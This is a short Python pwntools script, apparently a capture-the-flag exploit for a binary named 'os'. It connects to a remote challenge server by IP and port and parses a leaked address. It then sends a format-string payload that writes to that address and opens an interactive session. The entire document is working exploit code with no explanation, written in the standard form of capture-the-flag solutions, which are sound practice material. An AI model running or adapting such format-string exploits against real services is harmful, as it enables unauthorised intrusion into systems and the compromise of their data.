from pwn import *

e = ELF("./os")
context.binary = e

r = remote("35.240.148.138",5004)
#r = process([e.path])

leak = int(r.recvline().decode().strip()[2:],16)
payload = fmtstr_payload(6,{leak:1})
r.sendlineafter('O/S?\n',payload)
r.interactive()